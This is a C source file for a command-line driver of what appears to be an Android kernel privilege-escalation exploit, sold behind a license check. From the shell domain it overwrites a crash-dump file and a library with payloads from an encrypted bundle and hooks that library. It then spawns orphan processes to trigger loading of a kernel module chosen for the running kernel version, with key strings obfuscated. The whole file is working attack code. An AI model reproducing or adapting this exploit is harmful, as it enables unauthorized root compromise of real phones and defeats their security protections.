/* exp_cli.c - standalone shell-domain fire binary (v2.2 adb-fire)
 *
 * Built as a STATIC aarch64 binary, staged at /data/local/tmp/exp_cli by the
 * companion APK (via Shizuku shell), executed in the SHELL SELinux domain.
 * Reuses exp.c internals through #include with EXP_CLI defined:
 *   - reportln/reportfmt print to stderr instead of JNI callbacks
 *   - n1's JNI parameter unpacking is replaced by file-based inputs
 *
 * Files expected in /data/local/tmp (staged by the APK):
 *   lic.bin   - activated license (raw, LIC_RAW_LEN bytes)
 *   fp.bin    - APK signing cert SHA-256 (32 bytes, constant per build)
 *   blob.bin  - encrypted asset bundle for lic_bundle_get
 *
 * Usage:
 *   exp_cli --window 180000 --orphan-int 10 [--kmi android15-6.6]
 */
#define EXP_CLI 1
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "exp.c"

/* CLI reporter: env pointer == 1 marks "print to stderr" */
static struct Reporter cli_reporter(void) {
    struct Reporter r;
    r.env = (JNIEnv *)1;
    r.obj = NULL;
    return r;
}

static int read_file(const char *path, uint8_t **out, size_t *out_len) {
    FILE *f = fopen(path, "rb");
    if (!f) return -1;
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz <= 0) { fclose(f); return -1; }
    uint8_t *buf = malloc(sz);
    if (!buf) { fclose(f); return -1; }
    if (fread(buf, 1, sz, f) != (size_t)sz) { free(buf); fclose(f); return -1; }
    fclose(f);
    *out = buf;
    *out_len = (size_t)sz;
    return 0;
}

static int hex_to_bytes(const char *hex, uint8_t *out, size_t out_len) {
    for (size_t i = 0; i < out_len; i++) {
        unsigned v;
        if (sscanf(hex + i * 2, "%2x", &v) != 1) return -1;
        out[i] = (uint8_t)v;
    }
    return 0;
}

int main(int argc, char **argv) {
    int window_ms = 180000;
    int orphan_int_s = 10;
    const char *lic_path = "/data/local/tmp/lic.bin";
    const char *fp_path = "/data/local/tmp/fp.bin";
    const char *blob_path = "/data/local/tmp/blob.bin";
    const char *kmi = "android15-6.6";

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--window") && i + 1 < argc) window_ms = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--orphan-int") && i + 1 < argc) orphan_int_s = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--lic") && i + 1 < argc) lic_path = argv[++i];
        else if (!strcmp(argv[i], "--fp") && i + 1 < argc) fp_path = argv[++i];
        else if (!strcmp(argv[i], "--blob") && i + 1 < argc) blob_path = argv[++i];
        else if (!strcmp(argv[i], "--kmi") && i + 1 < argc) kmi = argv[++i];
    }

    struct Reporter cli_r = cli_reporter();
    struct Reporter *reporter = &cli_r;
    REPORTLN("exp_cli start: window=%dms orphan_int=%ds kmi=%s",
             window_ms, orphan_int_s, kmi);

    /* ---- license unlock from staged files ---- */
    uint8_t *lic = NULL, *fp = NULL, *blob = NULL;
    size_t lic_len = 0, blob_len = 0;
    uint8_t fp_buf[32];

    if (read_file(lic_path, &lic, &lic_len) < 0) {
        REPORTLN("lic.bin missing at %s", lic_path);
        return 2;
    }
    if (read_file(fp_path, &fp, &blob_len) < 0 || blob_len < 32) {
        REPORTLN("fp.bin missing/short at %s", fp_path);
        return 2;
    }
    memcpy(fp_buf, fp, 32);
    free(fp);
    if (read_file(blob_path, &blob, &blob_len) < 0) {
        REPORTLN("blob.bin missing at %s", blob_path);
        return 2;
    }
    REPORTLN("lic=%zu blob=%zu fp loaded", lic_len, blob_len);

    /* salt_extra: the 32-byte tail (zeros on a clean run, per lic_unlock) */
    uint8_t tail[32];
    memset(tail, 0, sizeof tail);
    int urc = lic_unlock(lic, lic_len, fp_buf, tail, 32, blob, blob_len);
    REPORTLN("lic_unlock rc=%d unlocked=%d", urc, lic_is_unlocked());
    if (urc != 0 || !lic_is_unlocked()) {
        REPORTLN("unlock failed - check lic/fp/blob pairing");
        return 3;
    }

    /* ---- KMI-driven KO selection (same as the APK path) ---- */
    int andr = 0, kmaj = 0, kmin = 0;
    {
        struct utsname u;
        if (uname(&u) == 0) {
            sscanf(u.release, "%d.%d.%d", &kmaj, &kmin, &andr);
            char km[32];
            sscanf(u.release, "%*d.%*d.%*d-android%d-%d.%d", &andr, &kmaj, &kmin);
        }
    }
    REPORTLN("kernel: android%d %d.%d", andr, kmaj, kmin);

    /* ---- replicate n1: patch #1/#2 + hook + window ---- */
    struct PatchRestore libcxx_r = {0};
    int rc;
    size_t sh_len = 0;
    const uint8_t *sh = lic_bundle_get_splicer(&sh_len);
    if (!sh) { REPORTLN("no splicehelper in bundle"); return 4; }
    size_t sh_len_padded;
    char *sh_buf = pad16((const char *)sh, sh_len, &sh_len_padded);
    if (!sh_buf) return -1;
    REPORTLN(OBF(45), sh_len_padded);
    int ret = patch_file_cbc(kCrashDump, sh_buf, sh_len_padded, 0, 0, reporter);
    if (ret) { free(sh_buf); REPORTLN(OBF(46), ret); return ret; }

    {
        uint8_t verify[16];
        int vfd = open(kCrashDump, O_RDONLY);
        if (vfd >= 0) {
            ssize_t n = pread(vfd, verify, 16, 16);
            close(vfd);
            if (n == 16 && memcmp(verify, sh_buf + 16, 16) != 0) {
                REPORTLN(OBF(47));
                free(sh_buf);
                return -1;
            }
            REPORTLN(OBF(48));
        }
    }
    free(sh_buf);

    size_t ko_len = 0;
    const uint8_t *ko_data = lic_bundle_get(kmi, &ko_len);
    if (!ko_data) {
        int n = lic_bundle_count();
        for (int i = 0; i < n; i++) {
            const char *nm = lic_bundle_name(i);
            REPORTLN("  bundle has: %s", nm ? nm : "?");
            if (nm && strstr(nm, kmi)) {
                ko_data = lic_bundle_data(i, &ko_len);
                break;
            }
        }
    }
    if (!ko_data) { REPORTLN(OBF(46), -100); return -100; }

    size_t ko_len_padded;
    char *ko_buf = pad16((const char *)ko_data, ko_len, &ko_len_padded);
    if (!ko_buf) return -1;
    REPORTLN(OBF(49), libcxx_ko_target, ko_len_padded);
    ret = patch_file_cbc(libcxx_ko_target, ko_buf, ko_len_padded, 0, 1, reporter);
    free(ko_buf);
    if (ret) { REPORTLN(OBF(46), ret); return ret; }

    if (patch_hook(OBF(64), OBF(65),
                   libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
                   reporter, &libcxx_r)) goto done;

    rc = 2;
    usleep(500000);
    REPORTLN(OBF(66));
    createOrphanProcess(reporter);

    /* ---- trigger window (multi-orphan, marker verdict) ---- */
    int pre[3];
    {
        /* markers are /dev/xkm0, /dev/xkm1 and the mutex file */
        pre[0] = has_marker(OBF(67));
        pre[1] = has_marker(OBF(69));
        pre[2] = has_marker(OBF(71));
    }
    for (int elapsed = 0; elapsed < window_ms; elapsed += 10) {
        usleep(10000);
        if (elapsed > 0 && elapsed % (orphan_int_s * 1000) == 0) {
            REPORTLN("orphan cycle %d", elapsed / (orphan_int_s * 1000));
            createOrphanProcess(reporter);
        }
        int hit = 0;
        const char *paths[3] = { OBF(67), OBF(69), OBF(71) };
        for (int j = 0; j < 3; j++) {
            if (!pre[j] && has_marker(paths[j])) { hit = 1; break; }
        }
        if (hit) {
            REPORTLN(OBF(73), OBF(70));
            rc = 0;
            goto done;
        }
    }
    REPORTLN(OBF(63));
    rc = 1;

done:
    restore_hook(&libcxx_r, reporter);
    free(libcxx_r.shell_orig);
    REPORTLN(rc == 0 ? OBF(70) : "exp_cli done, rc != 0");
    free(lic);
    free(blob);
    return rc;
}
